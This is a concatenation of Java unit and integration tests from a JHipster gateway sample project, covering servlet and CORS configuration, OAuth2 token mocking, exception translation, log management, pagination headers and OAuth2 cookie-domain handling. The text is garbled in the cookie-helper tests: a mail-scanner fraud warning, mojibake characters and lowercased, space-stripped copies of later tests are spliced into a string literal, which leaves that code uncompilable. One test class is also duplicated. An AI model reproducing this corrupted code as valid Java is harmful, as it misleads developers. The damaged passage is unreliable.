        verify(servletContext, never()).addServlet(eq("H2Console"), any(WebServlet.class));
    }

    @Test
    public void testStartUpDevServletContext() throws ServletException {
        env.setActiveProfiles(JHipsterConstants.SPRING_PROFILE_DEVELOPMENT);
        webConfigurer.onStartup(servletContext);

        assertThat(servletContext.getAttribute(InstrumentedFilter.REGISTRY_ATTRIBUTE)).isEqualTo(metricRegistry);
        assertThat(servletContext.getAttribute(MetricsServlet.METRICS_REGISTRY)).isEqualTo(metricRegistry);
        verify(servletContext).addFilter(eq("webappMetricsFilter"), any(InstrumentedFilter.class));
        verify(servletContext).addServlet(eq("metricsServlet"), any(MetricsServlet.class));
        verify(servletContext, never()).addFilter(eq("cachingHttpHeadersFilter"), any(CachingHttpHeadersFilter.class));
        verify(servletContext).addServlet(eq("H2Console"), any(WebServlet.class));
    }

    @Test
    public void testCustomizeServletContainer() {
        env.setActiveProfiles(JHipsterConstants.SPRING_PROFILE_PRODUCTION);
        UndertowServletWebServerFactory container = new UndertowServletWebServerFactory();
        webConfigurer.customize(container);
        assertThat(container.getMimeMappings().get("abs")).isEqualTo("audio/x-mpeg");
        assertThat(container.getMimeMappings().get("html")).isEqualTo("text/html;charset=utf-8");
        assertThat(container.getMimeMappings().get("json")).isEqualTo("text/html;charset=utf-8");
        if (container.getDocumentRoot() != null) {
            assertThat(container.getDocumentRoot().getPath()).isEqualTo(FilenameUtils.separatorsToSystem("target/www"));
        }

        Builder builder = Undertow.builder();
        container.getBuilderCustomizers().forEach(c -> c.customize(builder));
        OptionMap.Builder serverOptions = (OptionMap.Builder) ReflectionTestUtils.getField(builder, "serverOptions");
        assertThat(serverOptions.getMap().get(UndertowOptions.ENABLE_HTTP2)).isNull();
    }

    @Test
    public void testUndertowHttp2Enabled() {
        props.getHttp().setVersion(JHipsterProperties.Http.Version.V_2_0);
        UndertowServletWebServerFactory container = new UndertowServletWebServerFactory();
        webConfigurer.customize(container);
        Builder builder = Undertow.builder();
        container.getBuilderCustomizers().forEach(c -> c.customize(builder));
        OptionMap.Builder serverOptions = (OptionMap.Builder) ReflectionTestUtils.getField(builder, "serverOptions");
        assertThat(serverOptions.getMap().get(UndertowOptions.ENABLE_HTTP2)).isTrue();
    }

    @Test
    public void testCorsFilterOnApiPath() throws Exception {
        props.getCors().setAllowedOrigins(Collections.singletonList("*"));
        props.getCors().setAllowedMethods(Arrays.asList("GET", "POST", "PUT", "DELETE"));
        props.getCors().setAllowedHeaders(Collections.singletonList("*"));
        props.getCors().setMaxAge(1800L);
        props.getCors().setAllowCredentials(true);

        MockMvc mockMvc = MockMvcBuilders.standaloneSetup(new WebConfigurerTestController())
            .addFilters(webConfigurer.corsFilter())
            .build();

        mockMvc.perform(
            options("/api/test-cors")
                .header(HttpHeaders.ORIGIN, "other.domain.com")
                .header(HttpHeaders.ACCESS_CONTROL_REQUEST_METHOD, "POST"))
            .andExpect(status().isOk())
            .andExpect(header().string(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN, "other.domain.com"))
            .andExpect(header().string(HttpHeaders.VARY, "Origin"))
            .andExpect(header().string(HttpHeaders.ACCESS_CONTROL_ALLOW_METHODS, "GET,POST,PUT,DELETE"))
            .andExpect(header().string(HttpHeaders.ACCESS_CONTROL_ALLOW_CREDENTIALS, "true"))
            .andExpect(header().string(HttpHeaders.ACCESS_CONTROL_MAX_AGE, "1800"));

        mockMvc.perform(
            get("/api/test-cors")
                .header(HttpHeaders.ORIGIN, "other.domain.com"))
            .andExpect(status().isOk())
            .andExpect(header().string(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN, "other.domain.com"));
    }

    @Test
    public void testCorsFilterOnOtherPath() throws Exception {
        props.getCors().setAllowedOrigins(Collections.singletonList("*"));
        props.getCors().setAllowedMethods(Arrays.asList("GET", "POST", "PUT", "DELETE"));
        props.getCors().setAllowedHeaders(Collections.singletonList("*"));
        props.getCors().setMaxAge(1800L);
        props.getCors().setAllowCredentials(true);

        MockMvc mockMvc = MockMvcBuilders.standaloneSetup(new WebConfigurerTestController())
            .addFilters(webConfigurer.corsFilter())
            .build();

        mockMvc.perform(
            get("/test/test-cors")
                .header(HttpHeaders.ORIGIN, "other.domain.com"))
            .andExpect(status().isOk())
            .andExpect(header().doesNotExist(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN));
    }

    @Test
    public void testCorsFilterDeactivated() throws Exception {
        props.getCors().setAllowedOrigins(null);

        MockMvc mockMvc = MockMvcBuilders.standaloneSetup(new WebConfigurerTestController())
            .addFilters(webConfigurer.corsFilter())
            .build();

        mockMvc.perform(
            get("/api/test-cors")
                .header(HttpHeaders.ORIGIN, "other.domain.com"))
            .andExpect(status().isOk())
            .andExpect(header().doesNotExist(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN));
    }

    @Test
    public void testCorsFilterDeactivated2() throws Exception {
        props.getCors().setAllowedOrigins(new ArrayList<>());

        MockMvc mockMvc = MockMvcBuilders.standaloneSetup(new WebConfigurerTestController())
            .addFilters(webConfigurer.corsFilter())
            .build();

        mockMvc.perform(
            get("/api/test-cors")
                .header(HttpHeaders.ORIGIN, "other.domain.com"))
            .andExpect(status().isOk())
            .andExpect(header().doesNotExist(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN));
    }
}

 
 
 
 
package com.baeldung.jhipster.gateway.security;

import org.springframework.boot.test.mock.mockito.MockBean;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.User;
import org.springframework.security.oauth2.common.DefaultOAuth2AccessToken;
import org.springframework.security.oauth2.provider.OAuth2Authentication;
import org.springframework.security.oauth2.provider.OAuth2Request;
import org.springframework.security.oauth2.provider.token.ResourceServerTokenServices;
import org.springframework.stereotype.Component;
import org.springframework.test.web.servlet.request.RequestPostProcessor;

import java.util.Collections;
import java.util.List;
import java.util.Set;
import java.util.UUID;
import java.util.stream.Collectors;

import static org.mockito.BDDMockito.given;

/**
 * A bean providing simple mocking of OAuth2 access tokens for security integration tests.
 */
@Component
public class OAuth2TokenMockUtil {

    @MockBean
    private ResourceServerTokenServices tokenServices;

    private OAuth2Authentication createAuthentication(String username, Set<String> scopes, Set<String> roles) {
        List<GrantedAuthority> authorities = roles.stream()
            .map(SimpleGrantedAuthority::new)
            .collect(Collectors.toList());

        User principal = new User(username, "test", true, true, true, true, authorities);
        Authentication authentication = new UsernamePasswordAuthenticationToken(principal, principal.getPassword(),
            principal.getAuthorities());

        // Create the authorization request and OAuth2Authentication object
        OAuth2Request authRequest = new OAuth2Request(null, "testClient", null, true, scopes, null, null, null,
            null);
        return new OAuth2Authentication(authRequest, authentication);
    }

    public RequestPostProcessor oauth2Authentication(String username, Set<String> scopes, Set<String> roles) {
        String uuid = String.valueOf(UUID.randomUUID());

        given(tokenServices.loadAuthentication(uuid))
            .willReturn(createAuthentication(username, scopes, roles));

        given(tokenServices.readAccessToken(uuid)).willReturn(new DefaultOAuth2AccessToken(uuid));

        return new OAuth2PostProcessor(uuid);
    }

    public RequestPostProcessor oauth2Authentication(String username, Set<String> scopes) {
        return oauth2Authentication(username, scopes, Collections.emptySet());
    }

    public RequestPostProcessor oauth2Authentication(String username) {
        return oauth2Authentication(username, Collections.emptySet());
    }

    public static class OAuth2PostProcessor implements RequestPostProcessor {

        private String token;

        public OAuth2PostProcessor(String token) {
            this.token = token;
        }

        @Override
        public MockHttpServletRequest postProcessRequest(MockHttpServletRequest mockHttpServletRequest) {
            mockHttpServletRequest.addHeader("Authorization", "Bearer " + token);

            return mockHttpServletRequest;
        }
    }
}

 
 
 
 
package com.baeldung.jhipster.gateway.web.rest.errors;

import org.springframework.dao.ConcurrencyFailureException;
import org.springframework.http.HttpStatus;
import org.springframework.security.access.AccessDeniedException;
import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.web.bind.annotation.*;

import javax.validation.Valid;
import javax.validation.constraints.NotNull;
import java.util.HashMap;
import java.util.Map;

@RestController
public class ExceptionTranslatorTestController {

    @GetMapping("/test/concurrency-failure")
    public void concurrencyFailure() {
        throw new ConcurrencyFailureException("test concurrency failure");
    }

    @PostMapping("/test/method-argument")
    public void methodArgument(@Valid @RequestBody TestDTO testDTO) {
    }

    @GetMapping("/test/parameterized-error")
    public void parameterizedError() {
        throw new CustomParameterizedException("test parameterized error", "param0_value", "param1_value");
    }

    @GetMapping("/test/parameterized-error2")
    public void parameterizedError2() {
        Map<String, Object> params = new HashMap<>();
        params.put("foo", "foo_value");
        params.put("bar", "bar_value");
        throw new CustomParameterizedException("test parameterized error", params);
    }

    @GetMapping("/test/missing-servlet-request-part")
    public void missingServletRequestPartException(@RequestPart String part) {
    }

    @GetMapping("/test/missing-servlet-request-parameter")
    public void missingServletRequestParameterException(@RequestParam String param) {
    }

    @GetMapping("/test/access-denied")
    public void accessdenied() {
        throw new AccessDeniedException("test access denied!");
    }

    @GetMapping("/test/unauthorized")
    public void unauthorized() {
        throw new BadCredentialsException("test authentication failed!");
    }

    @GetMapping("/test/response-status")
    public void exceptionWithReponseStatus() {
        throw new TestResponseStatusException();
    }

    @GetMapping("/test/internal-server-error")
    public void internalServerError() {
        throw new RuntimeException();
    }

    public static class TestDTO {

        @NotNull
        private String test;

        public String getTest() {
            return test;
        }

        public void setTest(String test) {
            this.test = test;
        }
    }

    @ResponseStatus(value = HttpStatus.BAD_REQUEST, reason = "test response status")
    @SuppressWarnings("serial")
    public static class TestResponseStatusException extends RuntimeException {
    }

}

 
 
 
package com.baeldung.jhipster.gateway.web.rest.errors;

import com.baeldung.jhipster.gateway.GatewayApp;
import com.baeldung.jhipster.gateway.config.SecurityBeanOverrideConfiguration;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.http.converter.json.MappingJackson2HttpMessageConverter;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;

import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * Test class for the ExceptionTranslator controller advice.
 *
 * @see ExceptionTranslator
 */
@RunWith(SpringRunner.class)
@SpringBootTest(classes = {SecurityBeanOverrideConfiguration.class, GatewayApp.class})
public class ExceptionTranslatorIntTest {

    @Autowired
    private ExceptionTranslatorTestController controller;

    @Autowired
    private ExceptionTranslator exceptionTranslator;

    @Autowired
    private MappingJackson2HttpMessageConverter jacksonMessageConverter;

    private MockMvc mockMvc;

    @Before
    public void setup() {
        mockMvc = MockMvcBuilders.standaloneSetup(controller)
            .setControllerAdvice(exceptionTranslator)
            .setMessageConverters(jacksonMessageConverter)
            .build();
    }

    @Test
    public void testConcurrencyFailure() throws Exception {
        mockMvc.perform(get("/test/concurrency-failure"))
            .andExpect(status().isConflict())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value(ErrorConstants.ERR_CONCURRENCY_FAILURE));
    }

    @Test
    public void testMethodArgumentNotValid() throws Exception {
         mockMvc.perform(post("/test/method-argument").content("{}").contentType(MediaType.APPLICATION_JSON))
             .andExpect(status().isBadRequest())
             .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
             .andExpect(jsonPath("$.message").value(ErrorConstants.ERR_VALIDATION))
             .andExpect(jsonPath("$.fieldErrors.[0].objectName").value("testDTO"))
             .andExpect(jsonPath("$.fieldErrors.[0].field").value("test"))
             .andExpect(jsonPath("$.fieldErrors.[0].message").value("NotNull"));
    }

    @Test
    public void testParameterizedError() throws Exception {
        mockMvc.perform(get("/test/parameterized-error"))
            .andExpect(status().isBadRequest())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("test parameterized error"))
            .andExpect(jsonPath("$.params.param0").value("param0_value"))
            .andExpect(jsonPath("$.params.param1").value("param1_value"));
    }

    @Test
    public void testParameterizedError2() throws Exception {
        mockMvc.perform(get("/test/parameterized-error2"))
            .andExpect(status().isBadRequest())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("test parameterized error"))
            .andExpect(jsonPath("$.params.foo").value("foo_value"))
            .andExpect(jsonPath("$.params.bar").value("bar_value"));
    }

    @Test
    public void testMissingServletRequestPartException() throws Exception {
        mockMvc.perform(get("/test/missing-servlet-request-part"))
            .andExpect(status().isBadRequest())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("error.http.400"));
    }

    @Test
    public void testMissingServletRequestParameterException() throws Exception {
        mockMvc.perform(get("/test/missing-servlet-request-parameter"))
            .andExpect(status().isBadRequest())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("error.http.400"));
    }

    @Test
    public void testAccessDenied() throws Exception {
        mockMvc.perform(get("/test/access-denied"))
            .andExpect(status().isForbidden())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("error.http.403"))
            .andExpect(jsonPath("$.detail").value("test access denied!"));
    }

    @Test
    public void testUnauthorized() throws Exception {
        mockMvc.perform(get("/test/unauthorized"))
            .andExpect(status().isUnauthorized())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("error.http.401"))
            .andExpect(jsonPath("$.path").value("/test/unauthorized"))
            .andExpect(jsonPath("$.detail").value("test authentication failed!"));
    }

    @Test
    public void testMethodNotSupported() throws Exception {
        mockMvc.perform(post("/test/access-denied"))
            .andExpect(status().isMethodNotAllowed())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("error.http.405"))
            .andExpect(jsonPath("$.detail").value("Request method 'POST' not supported"));
    }

    @Test
    public void testExceptionWithResponseStatus() throws Exception {
        mockMvc.perform(get("/test/response-status"))
            .andExpect(status().isBadRequest())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("error.http.400"))
            .andExpect(jsonPath("$.title").value("test response status"));
    }

    @Test
    public void testInternalServerError() throws Exception {
        mockMvc.perform(get("/test/internal-server-error"))
            .andExpect(status().isInternalServerError())
            .andExpect(content().contentType(MediaType.APPLICATION_PROBLEM_JSON))
            .andExpect(jsonPath("$.message").value("error.http.500"))
            .andExpect(jsonPath("$.title").value("Internal Server Error"));
    }

}

 
 
 
package com.baeldung.jhipster.gateway.web.rest;

import com.baeldung.jhipster.gateway.GatewayApp;
import com.baeldung.jhipster.gateway.config.SecurityBeanOverrideConfiguration;
import com.baeldung.jhipster.gateway.web.rest.vm.LoggerVM;
import ch.qos.logback.classic.AsyncAppender;
import ch.qos.logback.classic.LoggerContext;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.slf4j.LoggerFactory;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.put;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * Test class for the LogsResource REST controller.
 *
 * @see LogsResource
 */
@RunWith(SpringRunner.class)
@SpringBootTest(classes = {SecurityBeanOverrideConfiguration.class, GatewayApp.class})
public class LogsResourceIntTest {

    private MockMvc restLogsMockMvc;

    @Before
    public void setup() {
        LogsResource logsResource = new LogsResource();
        this.restLogsMockMvc = MockMvcBuilders
            .standaloneSetup(logsResource)
            .build();
    }

    @Test
    public void getAllLogs() throws Exception {
        restLogsMockMvc.perform(get("/management/logs"))
            .andExpect(status().isOk())
            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE));
    }

    @Test
    public void changeLogs() throws Exception {
        LoggerVM logger = new LoggerVM();
        logger.setLevel("INFO");
        logger.setName("ROOT");

        restLogsMockMvc.perform(put("/management/logs")
            .contentType(TestUtil.APPLICATION_JSON_UTF8)
            .content(TestUtil.convertObjectToJsonBytes(logger)))
            .andExpect(status().isNoContent());
    }

    @Test
    public void testLogstashAppender() {
        LoggerContext context = (LoggerContext) LoggerFactory.getILoggerFactory();
        assertThat(context.getLogger("ROOT").getAppender("ASYNC_LOGSTASH")).isInstanceOf(AsyncAppender.class);
    }
}

 
 
package com.baeldung.jhipster.gateway.web.rest;

import com.baeldung.jhipster.gateway.GatewayApp;
import com.baeldung.jhipster.gateway.config.SecurityBeanOverrideConfiguration;
import com.baeldung.jhipster.gateway.web.rest.vm.LoggerVM;
import ch.qos.logback.classic.AsyncAppender;
import ch.qos.logback.classic.LoggerContext;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.slf4j.LoggerFactory;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.put;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * Test class for the LogsResource REST controller.
 *
 * @see LogsResource
 */
@RunWith(SpringRunner.class)
@SpringBootTest(classes = {SecurityBeanOverrideConfiguration.class, GatewayApp.class})
public class LogsResourceIntTest {

    private MockMvc restLogsMockMvc;

    @Before
    public void setup() {
        LogsResource logsResource = new LogsResource();
        this.restLogsMockMvc = MockMvcBuilders
            .standaloneSetup(logsResource)
            .build();
    }

    @Test
    public void getAllLogs() throws Exception {
        restLogsMockMvc.perform(get("/management/logs"))
            .andExpect(status().isOk())
            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE));
    }

    @Test
    public void changeLogs() throws Exception {
        LoggerVM logger = new LoggerVM();
        logger.setLevel("INFO");
        logger.setName("ROOT");

        restLogsMockMvc.perform(put("/management/logs")
            .contentType(TestUtil.APPLICATION_JSON_UTF8)
            .content(TestUtil.convertObjectToJsonBytes(logger)))
            .andExpect(status().isNoContent());
    }

    @Test
    public void testLogstashAppender() {
        LoggerContext context = (LoggerContext) LoggerFactory.getILoggerFactory();
        assertThat(context.getLogger("ROOT").getAppender("ASYNC_LOGSTASH")).isInstanceOf(AsyncAppender.class);
    }
}

 
 
package com.baeldung.jhipster.gateway.web.rest;

import com.fasterxml.jackson.annotation.JsonInclude;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.datatype.jsr310.JavaTimeModule;
import org.hamcrest.Description;
import org.hamcrest.TypeSafeDiagnosingMatcher;
import org.springframework.format.datetime.standard.DateTimeFormatterRegistrar;
import org.springframework.format.support.DefaultFormattingConversionService;
import org.springframework.format.support.FormattingConversionService;
import org.springframework.http.MediaType;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.time.ZonedDateTime;
import java.time.format.DateTimeParseException;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Utility class for testing REST controllers.
 */
public class TestUtil {

    /** MediaType for JSON UTF8 */
    public static final MediaType APPLICATION_JSON_UTF8 = new MediaType(
            MediaType.APPLICATION_JSON.getType(),
            MediaType.APPLICATION_JSON.getSubtype(), StandardCharsets.UTF_8);

    /**
     * Convert an object to JSON byte array.
     *
     * @param object
     *            the object to convert
     * @return the JSON byte array
     * @throws IOException
     */
    public static byte[] convertObjectToJsonBytes(Object object)
            throws IOException {
        ObjectMapper mapper = new ObjectMapper();
        mapper.setSerializationInclusion(JsonInclude.Include.NON_EMPTY);

        JavaTimeModule module = new JavaTimeModule();
        mapper.registerModule(module);

        return mapper.writeValueAsBytes(object);
    }

    /**
     * Create a byte array with a specific size filled with specified data.
     *
     * @param size the size of the byte array
     * @param data the data to put in the byte array
     * @return the JSON byte array
     */
    public static byte[] createByteArray(int size, String data) {
        byte[] byteArray = new byte[size];
        for (int i = 0; i < size; i++) {
            byteArray[i] = Byte.parseByte(data, 2);
        }
        return byteArray;
    }

    /**
     * A matcher that tests that the examined string represents the same instant as the reference datetime.
     */
    public static class ZonedDateTimeMatcher extends TypeSafeDiagnosingMatcher<String> {

        private final ZonedDateTime date;

        public ZonedDateTimeMatcher(ZonedDateTime date) {
            this.date = date;
        }

        @Override
        protected boolean matchesSafely(String item, Description mismatchDescription) {
            try {
                if (!date.isEqual(ZonedDateTime.parse(item))) {
                    mismatchDescription.appendText("was ").appendValue(item);
                    return false;
                }
                return true;
            } catch (DateTimeParseException e) {
                mismatchDescription.appendText("was ").appendValue(item)
                    .appendText(", which could not be parsed as a ZonedDateTime");
                return false;
            }

        }

        @Override
        public void describeTo(Description description) {
            description.appendText("a String representing the same Instant as ").appendValue(date);
        }
    }

    /**
     * Creates a matcher that matches when the examined string reprensents the same instant as the reference datetime
     * @param date the reference datetime against which the examined string is checked
     */
    public static ZonedDateTimeMatcher sameInstant(ZonedDateTime date) {
        return new ZonedDateTimeMatcher(date);
    }

    /**
     * Verifies the equals/hashcode contract on the domain object.
     */
    public static <T> void equalsVerifier(Class<T> clazz) throws Exception {
        T domainObject1 = clazz.getConstructor().newInstance();
        assertThat(domainObject1.toString()).isNotNull();
        assertThat(domainObject1).isEqualTo(domainObject1);
        assertThat(domainObject1.hashCode()).isEqualTo(domainObject1.hashCode());
        // Test with an instance of another class
        Object testOtherObject = new Object();
        assertThat(domainObject1).isNotEqualTo(testOtherObject);
        assertThat(domainObject1).isNotEqualTo(null);
        // Test with an instance of the same class
        T domainObject2 = clazz.getConstructor().newInstance();
        assertThat(domainObject1).isNotEqualTo(domainObject2);
        // HashCodes are equals because the objects are not persisted yet
        assertThat(domainObject1.hashCode()).isEqualTo(domainObject2.hashCode());
    }

    /**
     * Create a FormattingConversionService which use ISO date format, instead of the localized one.
     * @return the FormattingConversionService
     */
    public static FormattingConversionService createFormattingConversionService() {
        DefaultFormattingConversionService dfcs = new DefaultFormattingConversionService ();
        DateTimeFormatterRegistrar registrar = new DateTimeFormatterRegistrar();
        registrar.setUseIsoFormat(true);
        registrar.registerFormatters(dfcs);
        return dfcs;
    }
}

 
 
package com.baeldung.jhipster.gateway.web.rest.util;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertTrue;

import java.util.ArrayList;
import java.util.List;

import org.junit.Test;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.PageImpl;
import org.springframework.data.domain.PageRequest;
import org.springframework.http.HttpHeaders;

/**
 * Tests based on parsing algorithm in app/components/util/pagination-util.service.js
 *
 * @see PaginationUtil
 */
public class PaginationUtilUnitTest {

    @Test
    public void generatePaginationHttpHeadersTest() {
        String baseUrl = "/api/_search/example";
        List<String> content = new ArrayList<>();
        Page<String> page = new PageImpl<>(content, PageRequest.of(6, 50), 400L);
        HttpHeaders headers = PaginationUtil.generatePaginationHttpHeaders(page, baseUrl);
        List<String> strHeaders = headers.get(HttpHeaders.LINK);
        assertNotNull(strHeaders);
        assertTrue(strHeaders.size() == 1);
        String headerData = strHeaders.get(0);
        assertTrue(headerData.split(",").length == 4);
        String expectedData = "</api/_search/example?page=7&size=50>; rel=\"next\","
                + "</api/_search/example?page=5&size=50>; rel=\"prev\","
                + "</api/_search/example?page=7&size=50>; rel=\"last\","
                + "</api/_search/example?page=0&size=50>; rel=\"first\"";
        assertEquals(expectedData, headerData);
        List<String> xTotalCountHeaders = headers.get("X-Total-Count");
        assertTrue(xTotalCountHeaders.size() == 1);
        assertTrue(Long.valueOf(xTotalCountHeaders.get(0)).equals(400L));
    }

}

 
package com.baeldung.jhipster.gateway.security.oauth2;

import com.baeldung.jhipster.gateway.config.oauth2.OAuth2Properties;
import org.junit.Assert;
import org.junit.Before;
import org.junit.Test;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.test.util.ReflectionTestUtils;

/**
 * Tests helper functions around OAuth2 Cookies.
 *
 * @see OAuth2CookieHelper
 */
public class OAuth2CookieHelperTest {
    public static final String GET_COOKIE_DOMAIN_METHOD = "getCookieDomain";
    private OAuth2Properties oAuth2Properties;
    private OAuth2CookieHelper cookieHelper;

    @Before
    public void setUp() throws NoSuchMethodException {
        oAuth2Properties = new OAuth2Properties();
        cookieHelper = new OAuth2CookieHelper(oAuth2Properties);
    }

    @Test
    public void testLocalhostDomain() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("localhost");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertNull(name);
    }

    @Test
    public void testComDomain() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("test.com");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertNull(name);        //already top-level domain
    }

    @Test
    public void testWwwDomainCom() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("MailScanner has detected a possible fraud attempt from "www.test.com");ÂÂÂÂÂÂÂstringname=reflectiontestutils.invokemethod(cookiehelper,get_cookie_domain_method,request);ÂÂÂÂÂÂÂassert.assertnull(name);ÂÂÂ}ÂÂÂ@testÂÂÂpublicvoidtestcomsubdomain(){ÂÂÂÂÂÂÂmockhttpservletrequestrequest=newmockhttpservletrequest();ÂÂÂÂÂÂÂrequest.setservername("abc.test.com");ÂÂÂÂÂÂÂstringname=reflectiontestutils.invokemethod(cookiehelper,get_cookie_domain_method,request);ÂÂÂÂÂÂÂassert.assertequals(".test.com",name);ÂÂÂ}ÂÂÂ@testÂÂÂpublicvoidtestwwwsubdomaincom(){ÂÂÂÂÂÂÂmockhttpservletrequestrequest=newmockhttpservletrequest();ÂÂÂÂÂÂÂrequest.setservername("www.abc.test.com");ÂÂÂÂÂÂÂstringname=reflectiontestutils.invokemethod(cookiehelper,get_cookie_domain_method,request);ÂÂÂÂÂÂÂassert.assertequals(".test.com",name);ÂÂÂ}ÂÂÂ@testÂÂÂpublicvoidtestcoukdomain(){ÂÂÂÂÂÂÂmockhttpservletrequestrequest=newmockhttpservletrequest();ÂÂÂÂÂÂÂrequest.setservername("test.co.uk");ÂÂÂÂÂÂÂstringname=reflectiontestutils.invokemethod(cookiehelper,get_cookie_domain_method,request);ÂÂÂÂÂÂÂassert.assertnull(name);ÂÂÂÂÂÂÂÂÂÂÂ" claiming to be www.test.com");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertNull(name);
    }

    @Test
    public void testComSubDomain() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("abc.test.com");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertEquals(".test.com", name);
    }

    @Test
    public void testWwwSubDomainCom() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("www.abc.test.com");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertEquals(".test.com", name);
    }


    @Test
    public void testCoUkDomain() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("test.co.uk");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertNull(name);            //already top-level domain
    }

    @Test
    public void testCoUkSubDomain() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("abc.test.co.uk");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertEquals(".test.co.uk", name);
    }

    @Test
    public void testNestedDomain() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("abc.xyu.test.co.uk");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertEquals(".test.co.uk", name);
    }

    @Test
    public void testIpAddress() {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.setServerName("127.0.0.1");
        String name = ReflectionTestUtils.invokeMethod(cookieHelper, GET_COOKIE_DOMAIN_METHOD, request);
        Assert.assertNull(name);
    }
}

 
 
package com.baeldung.jhipster.gateway.security.oauth2;

import com.baeldung.jhipster.gateway.config.oauth2.OAuth2Properties;
import com.baeldung.jhipster.gateway.web.filter.RefreshTokenFilter;
import com.baeldung.jhipster.gateway.web.rest.errors.InvalidPasswordException;
import io.github.jhipster.config.JHipsterProperties;
import org.junit.Assert;
import org.junit.Before;
import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.ExpectedException;
import org.junit.runner.RunWith;
import org.mockito.Mock;
import org.mockito.junit.MockitoJUnitRunner;
import org.springframework.http.*;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.mock.web.MockHttpServletResponse;
